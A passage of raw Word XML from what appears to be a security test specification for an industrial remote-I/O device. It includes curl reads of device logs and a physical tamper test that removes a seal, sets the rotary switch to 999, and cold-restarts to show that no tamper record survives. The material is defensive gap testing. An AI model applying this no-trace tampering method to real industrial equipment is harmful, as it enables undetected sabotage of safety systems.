    <w:p w14:paraId="73FBC011" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId65" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC01_log_after.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C044051" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId66" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/deviceinfo/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC01_iandm_after.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A242BE1" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>diff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC01_iandm_base.json TC01_iandm_after.json | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>tee</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC01_iandm_diff.txt # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>expect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> REVISION_COUNTER +1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B44962" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>Readable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> (CR 6.1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>met</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">) ☐ REVISION_COUNTER </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>incremented</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> ☐ No </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>identity</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>timestamp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>present</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC01_*.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">, TC01_iandm_diff.txt, IoT-Core </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>screenshots</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076FE4A2" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00000000" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="5229FA04">
          <v:rect id="_x0000_i1042" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA2DEE2" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ003-03 — Illegitimate Physical Intervention &amp; Anti-Forensic Clearing (G-1 / G-3 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054D819C" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74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759"/>
      </w:tblGrid>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="3D9C79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71FAAB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AA200D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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="417F4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A6B18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B5096" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>TC-RQ003-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="08777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BC892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A78C2" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>RQ-003 → EDR 3.11 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>detection</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>) / CR 2.8 / CR 2.12 / CR 3.9 → Asset G, Asset I</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="151D3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C149B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F6D34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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Repudiation</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (+ anti-forensic Tampering on audit data)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="1ADEF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90BFD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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74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DAD52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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (Penetration Testing — physical, PA-4)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="44DAF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FE8E4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lastRenderedPageBreak/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66F5B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Demonstrate that (a) a physical intervention avoiding visible seal damage produces </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no automatic tamper record and no attribution</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, and (b) a subsequent </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cold start clears</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> any incidental log content — proving the device cannot collect retained, protected evidence of intervention.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="11A64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54155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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74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81478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1. Capture baseline log/I&amp;M/address. 2. Remove seal/sleeve carefully; change the rotary switch (incl. → 999 to enter update mode); note any live status change. 3. Cold-restart to apply the change. 4. Re-read the log and check for any tamper/intervention entry; check whether the log survived the cold start. 5. Assess attribution (identity) and timing (absolute timestamp) of anything found.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="6C3D2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98403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A3982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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected:</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> no tamper-specific entry is generated; any incidental entries are </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>lost on cold start</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; no user identity and no absolute timestamp are present. This confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-1 (no detection/attribution)</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-3 (unprotected, non-retained evidence)</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL against RQ-003</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> is recorded. A device that </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>did</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> produce a persistent, attributed, time-stamped tamper record would indicate an </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>undocumented</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> capability to investigate.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="01584AA5" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74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271C74" w:rsidRPr="00271C74" w14:paraId="0C43BF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344C1F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59133B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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="42EE4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AD408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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C7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4FBD8" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>TC-RQ003-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="5FB91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F4E58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D5EC3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Physical access to DUT 192.168.0.2; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> path Pi eth1 = 192.168.50.10; browser 192.168.50.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="4C200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7CEEE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A6FCE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Manual (seal removal, switch actuation); camera; curl to IoT-Core</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="0CFE7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402F5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Commands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22114C" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="18ED1C71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># TC-RQ003-03 Physical tamper -&gt; evidence check across cold start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B68D618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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId67" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC03_log_before.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FEA35A7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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId68" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/safecom/f_address</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC03_addr_before.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371926D4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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId69" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/operatingstate</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC03_state_before.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF360B7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# --- remove seal, change rotary switch (e.g. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> change; then 999), COLD RESTART ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D2342E" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId70" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC03_log_after.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C28B18A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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId71" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/safecom/f_address</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC03_addr_after.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302FB308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>diff TC03_log_before.json TC03_log_after.json | tee TC03_logdiff.txt # expect: empty/cleared, no tamper event</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F400B7" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | No tamper entry; log empty after cold start (circular, non-safety QM, cleared on cold start); address changed with no attribution/time. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ No evidence collected (G-1/G-3 confirmed) ☐ Evidence found (investigate) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Seal before/after photos, TC03_log_before/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>after.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, TC03_logdiff.txt, update-mode LED photo, address diff | </w:t>
      </w:r>
      <w:hyperlink r:id="rId72" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId73" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1BCC38E9" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00000000" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="2F693E07">
          <v:rect id="_x0000_i1043" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B0009D" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
